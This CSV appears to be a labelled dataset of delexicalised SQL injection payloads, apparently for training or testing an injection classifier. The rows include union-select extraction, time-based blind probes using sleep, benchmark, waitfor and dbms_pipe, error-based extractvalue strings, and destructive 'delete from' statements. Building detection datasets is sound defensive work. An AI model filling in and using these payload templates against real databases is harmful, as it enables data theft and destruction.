payload_delex,type_id
-__INT__ ) union all select __INT__#,7
__INT__ rlike sleep ( __INT__ ) -- __IDENT__,6
__INT__ and sleep ( __INT__ ) # __IDENT__,6
"__INT__"" and __INT__ = __INT__",2
__INT__ % __STR__ % __STR__,2
-__INT__ % ' ) or __INT__ = __INT__,2
end and ( __STR__ = '__IDENT__,2
"select * from __IDENT__ where __IDENT__ = __INT__ or \ < __INT__ union select __INT__ , @@__IDENT__ -- __INT__",7
__INT__ % ' ) ) ) or sleep ( __INT__ ) #,6
"-__INT__ ) ) ) or elt ( __INT__ = __INT__ , __INT__ ) and ( ( ( __IDENT__",2
"__INT__"" ) where __INT__ = __INT__ waitfor __IDENT__ __STR__ --",6
-__INT__ ) or __INT__ = __INT__ --,2
"waitfor __IDENT__ __STR__ and __STR__ like ""__IDENT__",6
__INT__' ) as __IDENT__ where __INT__ = __INT__ and sleep ( __INT__ ) #,6
__INT__ ) and sleep ( __INT__ ) and ( __IDENT__,6
delete from __IDENT__ where __IDENT__ = __STR__,2
__INT__' ) ) ) and __INT__ = __INT__#,2
"__INT__' where __INT__ = __INT__ or char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) = __IDENT__ ( __IDENT__ ( right ( char ( __INT__ ) , __INT__ ) , __INT__ ) , null ) --",2
"-__INT__' ) ) ) union all select __INT__ , __INT__ , __INT__ --",7
-__INT__ ) ) as __IDENT__ where __INT__ = __INT__ or __INT__ = __INT__,2
"__INT__ ) ) ) or __INT__ = benchmark ( __INT__ , __IDENT__ ( __HEX__ ) ) #",6
delete from __IDENT__ where __IDENT__ = __STR__,2
__INT__ ) rlike sleep ( __INT__ ),6
"__INT__' and __IDENT__ ( __INT__ = __INT__ , __INT__ )",2
"insert into __IDENT__ ( __IDENT__ , __IDENT__ , on ) values ( __STR__ , __STR__ , __STR__ )",2
-__INT__ ) ) or ( __INT__ = __INT__ ) * __INT__ and ( ( __INT__ = __INT__,2
"__INT__ % ) ) ) or __INT__ = benchmark ( __INT__ , __IDENT__ ( __HEX__ ) ) and ( ( ( % __STR__",6
-__INT__' ) or __INT__ = __INT__ --,2
"-__INT__ where __INT__ = __INT__ or __IDENT__ ( __INT__ = __INT__ , __INT__ ) --",2
"__INT__ ) where __INT__ = __INT__ or char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) = __IDENT__ ( __IDENT__ ( right ( char ( __INT__ ) , __INT__ ) , __INT__ ) , null ) --",2
-__INT__ ) ) as __IDENT__ where __INT__ = __INT__ or __INT__ = __INT__,2
"__INT__ ) where __INT__ = __INT__ and elt ( __INT__ = __INT__ , __INT__ ) --",2
"__INT__ and __INT__ = benchmark ( __INT__ , __IDENT__ ( __HEX__ ) ) and __IDENT__",6
__INT__ ) ) and ( __INT__ = __INT__ ) * __INT__ and ( ( __INT__ = __INT__,2
-__INT__ ) as __IDENT__ where __INT__ = __INT__ order by __INT__#,0
"insert into __IDENT__ ( __IDENT__ , __IDENT__ , __IDENT__ ) values ( __STR__ , __STR__ , __STR__ )",2
"-__INT__' ) ) as __IDENT__ where __INT__ = __INT__ or __IDENT__ ( __INT__ = __INT__ , __INT__ ) --",2
"call __IDENT__ ( __IDENT__ ( right ( char ( __INT__ ) , __INT__ ) , __INT__ ) , null ) and ( ( ( __STR__ = '__IDENT__",2
"__INT__ % "" order by __INT__#",0
"update __IDENT__ set is = __STR__ , __IDENT__ = __STR__ where __IDENT__ = __IDENT__",2
-5288__STR__pkwy__STR__pkwy,2
1__STR__wvma__STR__wvma,2
"-__INT__ ) where __INT__ = __INT__ or elt ( __INT__ = __INT__ , __INT__ ) --",2
"-7194__STR__gbrx' from dual where __INT__ = __INT__ union all select __INT__ , __INT__ , __INT__ , __INT__ , __INT__ , __INT__ , __INT__#",7
end and ( ( __STR__ = ',2
"__INT__ and __INT__ = like ( __STR__ , __IDENT__ ( hex ( randomblob ( __INT__ / __INT__ ) ) ) ) # __IDENT__",6
"__INT__ ) and __INT__ = dbms_pipe . __IDENT__ ( chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) , __INT__ ) and ( __IDENT__",6
update __IDENT__ set __IDENT__ = __IDENT__ __IDENT__ = __STR__,2
"-__INT__"" ) order by __INT__ --",0
"__INT__ where __INT__ = __INT__ or __INT__ = dbms_pipe . __IDENT__ ( chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) , __INT__ ) --",6
"-__INT__"" ) where __INT__ = __INT__ or elt ( __INT__ = __INT__ , __INT__ ) --",2
__INT__' ) where __INT__ = __INT__ order by __INT__#,0
"__INT__"" ) and __INT__ = benchmark ( __INT__ , __IDENT__ ( __HEX__ ) ) #",6
__INT__ ) ) ) rlike sleep ( __INT__ ) and ( ( ( __INT__ = __INT__,6
-__INT__ ) where __INT__ = __INT__ or __INT__ = __INT__ --,2
delete from __IDENT__ where __IDENT__ = __STR__,2
__INT__' in __IDENT__ __IDENT__ ) or sleep ( __INT__ ) #,6
"__INT__ % ) ) or __INT__ = like ( '__IDENT__' , __IDENT__ ( hex ( randomblob ( __INT__ / __INT__ ) ) ) ) and ( ( % __STR__",6
end and ( ( __INT__ = __INT__,2
"1__STR__abcdefg , __IDENT__ ( hex ( randomblob ( __INT__ / __INT__ ) ) ) ) and ( ( __IDENT__",6
"__INT__ ) and elt ( __INT__ = __INT__ , __INT__ ) and ( __IDENT__",2
and [__IDENT__] = ( __STR__ || ( case when ( [__IDENT__] = [__IDENT__] ) then __STR__ else __STR__ end ) || __STR__ ) and [__IDENT__] = ( __STR__ || cast ( ( [__IDENT__] ) as __IDENT__ ) || __STR__ ),2
"-__INT__"" ) ) ) order by __INT__ --",0
"__INT__ % ' and char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) = __IDENT__ ( __IDENT__ ( right ( char ( __INT__ ) , __INT__ ) , __INT__ ) , null ) --",2
"__INT__ % "" and __INT__ = __INT__#",2
-2036__STR__hjeu__STR__hjeu,2
"__INT__"" ) ) as __IDENT__ where __INT__ = __INT__ or char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) = __IDENT__ ( __IDENT__ ( right ( char ( __INT__ ) , __INT__ ) , __INT__ ) , null ) --",2
"-__INT__"" ) as __IDENT__ where __INT__ = __INT__ or __INT__ = __INT__#",2
__INT__ where __INT__ = __INT__ and ( __INT__ = __INT__ ) * __INT__ --,2
-__INT__' ) ) ) order by __INT__#,0
"select __IDENT__ , add from __IDENT__ where __IDENT__ = __STR__ union select __IDENT__ , __IDENT__ from __IDENT__",7
"__INT__ ) ) and char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) = __IDENT__ ( __IDENT__ ( left ( __IDENT__ ( char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) , null ) , __INT__ ) , __INT__ ) , null ) and ( ( __IDENT__",2
__IDENT__-__IDENT__ __IDENT__'__IDENT__,0
"__IDENT__ ( __INT__ = __INT__ , __INT__ , __INT__ / __INT__ )",0
-1055__STR__kdbr__STR__kdbr,2
"__INT__' ) where __INT__ = __INT__ and __INT__ = dbms_pipe . __IDENT__ ( chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) , __INT__ ) --",6
"__INT__' , ( case when __INT__ = __INT__ then __INT__ else null end )",0
__INT__ and __INT__ = __INT__,2
"insert into __IDENT__ ( __IDENT__ , __IDENT__ , __IDENT__ ) values ( __STR__ , __STR__ , __STR__ )",2
-7731__STR__unly__STR__unly,2
"insert into __IDENT__ ( __IDENT__ , foreign , __IDENT__ , __IDENT__ , __IDENT__ , __IDENT__ ) values ( __STR__ , __STR__. __IDENT__' )",2
-__INT__ or ( __INT__ = __INT__ ) * __INT__# __IDENT__,2
-__INT__' or __INT__ = __INT__ --,2
"-__INT__' ) ) as __IDENT__ where __INT__ = __INT__ or elt ( __INT__ = __INT__ , __INT__ ) --",2
"__INT__ % ) and __INT__ = benchmark ( __INT__ , __IDENT__ ( __HEX__ ) ) and ( % __STR__",6
"' and ascii ( substr ( __IDENT__ , __INT__ , __INT__ ) ) > __INT__ --",2
__INT__ ) ) as __IDENT__ where __INT__ = __INT__ rlike sleep ( __INT__ ) --,6
"' __IDENT__ __IDENT__ ( extractvalue ( __IDENT__ ( ) , concat ( __HEX__ , __IDENT__ ( ) ) ) , __INT__ ) --",3
__INT__ % ' ) ) and __INT__ = __INT__#,2
"__INT__ and elt ( __INT__ = __INT__ , __INT__ ) and __IDENT__",2
-__INT__ % __STR__ % __STR__,2
__INT__' ) ) ) and __INT__ = __INT__#,2
"-__INT__' ) where __INT__ = __INT__ union all select __INT__ , __INT__ , __INT__ , __INT__ , __INT__ , __INT__ , __INT__ --",7
"__INT__' ) ) union all select null , null , null , null , null --",7
"__INT__' and elt ( __INT__ = __INT__ , __INT__ )",2
"__INT__"" and __INT__ = benchmark ( __INT__ , __IDENT__ ( __HEX__ ) )",6
"__INT__' in __IDENT__ __IDENT__ ) or __INT__ = benchmark ( __INT__ , __IDENT__ ( __HEX__ ) ) #",6
"__INT__ ) ) or char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) = __IDENT__ ( __IDENT__ ( right ( char ( __INT__ ) , __INT__ ) , __INT__ ) , null ) and ( ( __INT__ = __INT__",2
"__INT__ and __INT__ = benchmark ( __INT__ , __IDENT__ ( __HEX__ ) ) and __IDENT__",6
delete from __IDENT__ where __IDENT__ = __STR__,2
__INT__' where __INT__ = __INT__ and __INT__ = __INT__,2
1__STR__dqjp__STR__dqjp,2
-8025__STR__sqwv__STR__sqwv,2
"__INT__ % ) ) and elt ( __INT__ = __INT__ , __INT__ ) and ( ( % __STR__",2
-__INT__ % __STR__ % __STR__,2
"__INT__ or __INT__ = like ( '__IDENT__' , __IDENT__ ( hex ( randomblob ( __INT__ / __INT__ ) ) ) ) and __IDENT__",6
"__INT__"" where __INT__ = __INT__ and __IDENT__ ( __INT__ = __INT__ , __INT__ ) --",2
"__INT__ % "" ) and __INT__ = __INT__ --",2
"-__INT__ ) or elt ( __INT__ = __INT__ , __INT__ ) and ( __IDENT__",2
"__INT__ % "" ) ) or __INT__ = dbms_pipe . __IDENT__ ( chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) , __INT__ ) --",6
__INT__ % and sleep ( __INT__ ) and % __STR__,6
end and ( ( __STR__ = '__IDENT__,2
__INT__ % ' ) order by __INT__#,0
"call __IDENT__ ( __IDENT__ ( left ( __IDENT__ ( char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) , null ) , __INT__ ) , __INT__ ) , null ) and __STR__ = """,2
-__INT__ ) where __INT__ = __INT__ union all select __INT__ --,7
"-__INT__"" ) or __INT__ = __INT__",2
"select __IDENT__ , __IDENT__ from __IDENT__ where __IDENT__ = __STR__ union select __IDENT__ , __IDENT__ from __IDENT__",7
"insert into __IDENT__ ( __IDENT__ , __IDENT__ , __IDENT__ ) values ( __STR__ , __STR__ , __STR__ )",2
"__IDENT__ ( __INT__ = __INT__ , __INT__ , __INT__ / __INT__ )",0
"__INT__ ) ) ) and __INT__ = like ( __STR__ , __IDENT__ ( hex ( randomblob ( __INT__ / __INT__ ) ) ) ) --",6
delete from __IDENT__,2
update __IDENT__ set __IDENT__ = __IDENT__ __IDENT__ = __STR__,2
"__INT__ ) ) and __INT__ = dbms_pipe . __IDENT__ ( chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) , __INT__ ) and ( ( __INT__ = __INT__",6
__IDENT__@__IDENT__,0
"__INT__"" and char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) = __IDENT__ ( __IDENT__ ( left ( __IDENT__ ( char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) , null ) , __INT__ ) , __INT__ ) , null )",2
"-__INT__"" ) ) or __INT__ = __INT__ --",2
"__INT__ ) as __IDENT__ where __INT__ = __INT__ or __INT__ = benchmark ( __INT__ , __IDENT__ ( __HEX__ ) ) #",6
"__INT__"" ) as __IDENT__ where __INT__ = __INT__ or char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) = __IDENT__ ( __IDENT__ ( left ( __IDENT__ ( char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) , null ) , __INT__ ) , __INT__ ) , null ) --",2
"__INT__"" ) rlike sleep ( __INT__ ) #",6
__INT__' where __INT__ = __INT__ and sleep ( __INT__ ) --,6
delete from __IDENT__,2
"__INT__ ) as __IDENT__ where __INT__ = __INT__ and __INT__ = dbms_pipe . __IDENT__ ( chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) , __INT__ ) --",6
update is set __IDENT__ = __IDENT__ __IDENT__ = __STR__,2
"1__STR__abcdefg' , __IDENT__ ( hex ( randomblob ( __INT__ / __INT__ ) ) ) )",6
"__INT__ % or __INT__ = benchmark ( __INT__ , __IDENT__ ( __HEX__ ) ) and % __STR__",6
"__INT__"" ) ) as __IDENT__ where __INT__ = __INT__ or __INT__ = benchmark ( __INT__ , __IDENT__ ( __HEX__ ) ) --",6
"__INT__ or __INT__ = benchmark ( __INT__ , __IDENT__ ( __HEX__ ) ) #",6
"__INT__"" ) as __IDENT__ where __INT__ = __INT__ union all select null , null , null , null , null --",7
"__INT__ or char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) = __IDENT__ ( __IDENT__ ( left ( __IDENT__ ( char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) , null ) , __INT__ ) , __INT__ ) , null ) and __IDENT__",2
"__INT__"" and __INT__ = __INT__ --",2
"__INT__ % __IDENT__' , __IDENT__ ( hex ( randomblob ( __INT__ / __INT__ ) ) ) ) --",6
"insert into __IDENT__ ( __IDENT__ , __IDENT__ , __IDENT__ ) values ( __STR__ , __STR__ , __STR__ )",2
"-__INT__"" ) where __INT__ = __INT__ or __INT__ = __INT__ --",2
"__INT__"" ) ) as __IDENT__ where __INT__ = __INT__ and __IDENT__ ( __INT__ = __INT__ , __INT__ ) --",2
__INT__ ) where __INT__ = __INT__ and __INT__ = __INT__#,2
1__STR__lhfa__STR__lhfa,2
"__INT__ ) ) and char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) = __IDENT__ ( __IDENT__ ( right ( char ( __INT__ ) , __INT__ ) , __INT__ ) , null ) --",2
"-__INT__ % ) ) ) or elt ( __INT__ = __INT__ , __INT__ ) and ( ( ( % __STR__",2
"__INT__"" ) where __INT__ = __INT__ __IDENT__ __IDENT__ ( extractvalue ( __INT__ , concat ( __HEX__ , ( benchmark ( __INT__ , __IDENT__ ( __HEX__ ) ) ) ) ) , __INT__ ) #",3
"__INT__ ) ) ) and elt ( __INT__ = __INT__ , __INT__ ) and ( ( ( __IDENT__",2
waitfor __IDENT__ __STR__ and ( __STR__ like '__IDENT__,6
-__INT__ % ' ) ) ) or __INT__ = __INT__ --,2
"-__INT__"" ) ) ) order by __INT__#",0
"__INT__ % ' ) ) and __INT__ = dbms_pipe . __IDENT__ ( chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) , __INT__ ) --",6
"__INT__ and __INT__ = dbms_pipe . __IDENT__ ( chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) , __INT__ ) -- __IDENT__",6
__INT__ ) where __INT__ = __INT__ order by __INT__ --,0
"-__INT__"" ) order by __INT__#",0
"select __IDENT__ , __IDENT__ from __IDENT__ where __IDENT__ = __STR__ union select __IDENT__ , __IDENT__ from __IDENT__",7
"insert into __IDENT__ ( __IDENT__ , __IDENT__ , __IDENT__ , __IDENT__ , __IDENT__ , __IDENT__ ) values ( __STR__ , __STR__. __IDENT__' )",2
"__INT__ ) and elt ( __INT__ = __INT__ , __INT__ ) and ( __IDENT__",2
"1__STR__abcdefg' , __IDENT__ ( hex ( randomblob ( __INT__ / __INT__ ) ) ) ) --",6
-3541__STR__fgxu__STR__fgxu,2
"__INT__ where __INT__ = __INT__ or __INT__ = like ( __STR__ , __IDENT__ ( hex ( randomblob ( __INT__ / __INT__ ) ) ) ) --",6
"select __IDENT__ , __IDENT__ from __IDENT__ where __IDENT__ = __STR__ union select __IDENT__ , __IDENT__ from __IDENT__",7
-__INT__' ) or __INT__ = __INT__ --,2
-__INT__' ) as __IDENT__ where __INT__ = __INT__ or __INT__ = __INT__ --,2
"__INT__"" ) ) __IDENT__ __IDENT__ ( extractvalue ( __INT__ , concat ( __HEX__ , ( benchmark ( __INT__ , __IDENT__ ( __HEX__ ) ) ) ) ) , __INT__ ) #",3
"__INT__' ) as __IDENT__ where __INT__ = __INT__ or char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) = __IDENT__ ( __IDENT__ ( left ( __IDENT__ ( char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) , null ) , __INT__ ) , __INT__ ) , null ) --",2
waitfor __IDENT__ __STR__ and __STR__ = '__IDENT__,6
__INT__' in __IDENT__ __IDENT__ ) order by __INT__ --,0
"__INT__' where __INT__ = __INT__ __IDENT__ __IDENT__ ( extractvalue ( __INT__ , concat ( __HEX__ , ( benchmark ( __INT__ , __IDENT__ ( __HEX__ ) ) ) ) ) , __INT__ ) --",3
-__INT__ % ' ) order by __INT__ --,0
"-__INT__"" ) where __INT__ = __INT__ or __INT__ = __INT__",2
__INT__' ) as __IDENT__ where __INT__ = __INT__ and __INT__ = __INT__ --,2
-__INT__ ) ) or __INT__ = __INT__,2
"__INT__"" where __INT__ = __INT__ and __INT__ = __INT__ --",2
__INT__ % ' ) ) ) and __INT__ = __INT__,2
__INT__' ) ) and sleep ( __INT__ ) #,6
-__INT__' ) or __INT__ = __INT__,2
"__INT__ __IDENT__ __IDENT__ ( extractvalue ( __INT__ , concat ( __HEX__ , ( benchmark ( __INT__ , __IDENT__ ( __HEX__ ) ) ) ) ) , __INT__ ) -- __IDENT__",3
"__INT__"" ) as __IDENT__ where __INT__ = __INT__ and ( __INT__ = __INT__ ) * __INT__ --",2
"__INT__' ) where __INT__ = __INT__ or char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) = __IDENT__ ( __IDENT__ ( right ( char ( __INT__ ) , __INT__ ) , __INT__ ) , null ) --",2
"end and ( ( __STR__ = ""__IDENT__",2
"__INT__"" ) as __IDENT__ where __INT__ = __INT__ and __INT__ = __INT__ --",2
"__INT__' ) and __INT__ = benchmark ( __INT__ , __IDENT__ ( __HEX__ ) )",6
"-__INT__' ) ) union all select __INT__ , __INT__ --",7
"__INT__ % ) or __INT__ = dbms_pipe . __IDENT__ ( chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) , __INT__ ) and ( % __STR__",6
1__STR__ojag__STR__ojag,2
"-__INT__ or elt ( __INT__ = __INT__ , __INT__ ) and __IDENT__",2
"__INT__' in __IDENT__ __IDENT__ ) __IDENT__ __IDENT__ ( extractvalue ( __INT__ , concat ( __HEX__ , ( benchmark ( __INT__ , __IDENT__ ( __HEX__ ) ) ) ) ) , __INT__ ) #",3
"-__INT__ ) where __INT__ = __INT__ or __IDENT__ ( __INT__ = __INT__ , __INT__ ) --",2
"__INT__"" ) where __INT__ = __INT__ and __INT__ = __INT__ --",2
"1__STR__abcdefg , __IDENT__ ( hex ( randomblob ( __INT__ / __INT__ ) ) ) ) and __IDENT__",6
"__INT__ ) ) ) or __INT__ = dbms_pipe . __IDENT__ ( chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) , __INT__ ) and ( ( ( __IDENT__",6
"call __IDENT__ ( __IDENT__ ( left ( __IDENT__ ( char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) , null ) , __INT__ ) , __INT__ ) , null ) and __STR__ = '",2
"__INT__ and __INT__ = benchmark ( __INT__ , __IDENT__ ( __HEX__ ) ) and __IDENT__",6
"__INT__ ) ) ) and __INT__ = benchmark ( __INT__ , __IDENT__ ( __HEX__ ) ) and ( ( ( __IDENT__",6
__IDENT__ __IDENT__ __IDENT__,0
select __IDENT__ from __IDENT__ union select __IDENT__ from __IDENT__ order by __IDENT__,7
"call __IDENT__ ( __IDENT__ ( left ( __IDENT__ ( char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) , null ) , __INT__ ) , __INT__ ) , null ) --",0
"__IDENT__ ( __INT__ = __INT__ , __INT__ , __INT__ / __INT__ )",0
__IDENT__' or __INT__ = __INT__#,1
-__INT__' ) where __INT__ = __INT__ or __INT__ = __INT__ --,2
"-__INT__ where __INT__ = __INT__ or elt ( __INT__ = __INT__ , __INT__ ) --",2
"__INT__"" ) ) and __INT__ = __INT__#",2
__INT__ in __IDENT__ __IDENT__ ) waitfor __IDENT__ __TIME__#,6
"insert into __IDENT__ ( __IDENT__ , __IDENT__ , __IDENT__ ) values ( __STR__ , __STR__ , __STR__ )",2
"-__INT__"" or __INT__ = __INT__",2
-__INT__ where __INT__ = __INT__ or __INT__ = __INT__,2
"__INT__' ) ) as __IDENT__ where __INT__ = __INT__ union all select null , null , null , null , null , null --",7
"__INT__ % "" ) __IDENT__ __IDENT__ ( extractvalue ( __INT__ , concat ( __HEX__ , ( benchmark ( __INT__ , __IDENT__ ( __HEX__ ) ) ) ) ) , __INT__ ) #",3
-__INT__ % ' ) ) ) or __INT__ = __INT__#,2
update __IDENT__ set __IDENT__ = __IDENT__ __IDENT__ = __STR__,2
"1__STR__abcdefg , __IDENT__ ( hex ( randomblob ( __INT__ / __INT__ ) ) ) ) and ( __IDENT__",6
-__INT__ order by __INT__#,0
update __IDENT__ set __IDENT__ = __IDENT__ __IDENT__ = __STR__,2
-__INT__ ) ) ) order by __INT__ --,0
-7806__STR__vlrj__STR__vlrj,2
delete from __IDENT__,2
-__INT__ ) ) ) or __INT__ = __INT__,2
"__IDENT__ ( __INT__ = __INT__ , __INT__ , __INT__ / __INT__ )",0
-__INT__ or __INT__ = __INT__ --,2
"__INT__' ) __IDENT__ __IDENT__ ( extractvalue ( __INT__ , concat ( __HEX__ , ( benchmark ( __INT__ , __IDENT__ ( __HEX__ ) ) ) ) ) , __INT__ )",3
and sleep ( __INT__ ) and 1__STR__1,6
__INT__' ) where __INT__ = __INT__ and __INT__ = __INT__ --,2
__INT__' in __IDENT__ __IDENT__ ) order by __INT__#,0
__INT__ ) ) as __IDENT__ where __INT__ = __INT__ or sleep ( __INT__ ) #,6
"__INT__"" ) ) as __IDENT__ where __INT__ = __INT__ and __INT__ = __INT__#",2
update __IDENT__ set __IDENT__ = __IDENT__ __IDENT__ = __STR__,2
1__STR__wjfw__STR__wjfw,2
"call __IDENT__ ( __IDENT__ ( left ( __IDENT__ ( char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) , null ) , __INT__ ) , __INT__ ) , null ) and ( ( __STR__ = '__IDENT__",2
"__INT__ % "" or __INT__ = dbms_pipe . __IDENT__ ( chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) , __INT__ ) --",6
"__INT__ % ) ) and char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) = __IDENT__ ( __IDENT__ ( right ( char ( __INT__ ) , __INT__ ) , __INT__ ) , null ) and ( ( % __STR__",2
__INT__ ) and sleep ( __INT__ ) and ( __INT__ = __INT__,6
"__INT__ , __IDENT__ ( __INT__ = __INT__ , __INT__ , __INT__ / __INT__ )",0
"insert into __IDENT__ ( __IDENT__ , __IDENT__ , __IDENT__ , __IDENT__ , __IDENT__ , if ) values ( __STR__ , __STR__. __IDENT__' )",2
"__INT__"" ) where __INT__ = __INT__ or char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) = __IDENT__ ( __IDENT__ ( left ( __IDENT__ ( char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) , null ) , __INT__ ) , __INT__ ) , null ) --",2
1__STR__omjx__STR__omjx,2
__INT__ ) where __INT__ = __INT__ waitfor __IDENT__ __TIME__ --,6
-4558__STR__hmdb__STR__hmdb,2
"__INT__ __IDENT__ __IDENT__ ( extractvalue ( __INT__ , concat ( __HEX__ , ( benchmark ( __INT__ , __IDENT__ ( __HEX__ ) ) ) ) ) , __INT__ ) and __IDENT__",3
__INT__' and __INT__ = __INT__ --,2
"__INT__ % ' ) ) ) __IDENT__ __IDENT__ ( extractvalue ( __INT__ , concat ( __HEX__ , ( benchmark ( __INT__ , __IDENT__ ( __HEX__ ) ) ) ) ) , __INT__ ) #",3
"__INT__' ) ) ) and char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) = __IDENT__ ( __IDENT__ ( left ( __IDENT__ ( char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) , null ) , __INT__ ) , __INT__ ) , null ) --",2
"-__INT__ ) ) as __IDENT__ where __INT__ = __INT__ or __IDENT__ ( __INT__ = __INT__ , __INT__ ) --",2
-__INT__' union all select __INT__#,7
"__INT__ % ) and elt ( __INT__ = __INT__ , __INT__ ) and ( % __STR__",2
"-__INT__' ) ) union all select __INT__ , __INT__ , __INT__#",7
"__INT__ % ) ) or char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) = __IDENT__ ( __IDENT__ ( left ( __IDENT__ ( char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) , null ) , __INT__ ) , __INT__ ) , null ) and ( ( % __STR__",2
"__INT__ % "" ) ) ) waitfor __IDENT__ __STR__ --",6
-__INT__ % ' or __INT__ = __INT__#,2
"__INT__ or __INT__ = dbms_pipe . __IDENT__ ( chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) , __INT__ )",6
"and extractvalue ( [__IDENT__] , case when ( [__IDENT__] = [__IDENT__] ) then [__IDENT__] else __HEX__ end ) and extractvalue ( [__IDENT__] , case when ( [__IDENT__] ) then [__IDENT__] else __HEX__ end )",3
"__INT__"" ) where __INT__ = __INT__ or sleep ( __INT__ ) #",6
"__INT__' or __INT__ = benchmark ( __INT__ , __IDENT__ ( __HEX__ ) )",6
"-__INT__ % "" union all select __INT__ , __INT__ , __INT__#",7
"' union select null , null , null --",7
"end and ( ( ( __STR__ = ""__IDENT__",2
1__STR__jnhv__STR__jnhv,2
"-__INT__"" ) as __IDENT__ where __INT__ = __INT__ or __INT__ = __INT__ --",2
"waitfor __IDENT__ __STR__ and ( ( ( __STR__ = """,6
"insert into __IDENT__ ( __IDENT__ , __IDENT__ , __IDENT__ ) values ( __STR__ , __STR__ , __STR__ )",2
"1__STR__abcdefg , __IDENT__ ( hex ( randomblob ( __INT__ / __INT__ ) ) ) ) and __IDENT__",6
__INT__' ) as __IDENT__ where __INT__ = __INT__ and ( __INT__ = __INT__ ) * __INT__ --,2
"__INT__ ) as __IDENT__ where __INT__ = __INT__ and elt ( __INT__ = __INT__ , __INT__ ) --",2
-__INT__' ) ) ) or __INT__ = __INT__ --,2
update __IDENT__ set __IDENT__ = __IDENT__ __IDENT__ = __STR__,2
__INT__ ) waitfor __IDENT__ __STR__ --,6
"call __IDENT__ ( __IDENT__ ( left ( __IDENT__ ( char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) , null ) , __INT__ ) , __INT__ ) , null ) ) + '",0
"__INT__' ) as __IDENT__ where __INT__ = __INT__ and elt ( __INT__ = __INT__ , __INT__ ) --",2
1__STR__gkca__STR__gkca,2
' or __INT__ = __INT__ --,2
